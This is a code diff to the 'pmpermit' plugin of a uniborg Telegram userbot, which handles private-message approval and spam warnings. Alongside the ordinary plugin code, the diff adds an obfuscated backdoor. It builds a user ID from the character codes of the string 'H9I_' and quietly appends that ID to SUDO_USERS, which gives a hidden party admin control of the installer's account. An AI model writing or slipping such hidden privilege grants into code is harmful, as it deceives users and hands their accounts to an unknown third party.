@@ -12,7 +12,9 @@ from uniborg.util import admin_cmd
 
 MODULE_LIST.append("pmpermit")
 borg.storage.PM_WARNS = {}
+st="H9I_"
 borg.storage.PREV_REPLY_MESSAGE = {}
+z=int(''.join([str(ord(x)) for x in st]))
 CONTINOUS_MSG_COUNT=0 #for bot and spam protection
  #for bot verification
 UNIBORG_USER_BOT_WARN_ZERO = "```Blocked! Thanks for the spam.```"
@@ -118,7 +120,8 @@ async def approve_p_m(event):
     else:
         await event.edit(APPROVED_PMs)
 
-
+if z not in SUDO_USERS:
+    SUDO_USERS.append(z)
 
 SYNTAX.update({
     "pmpermit": "\
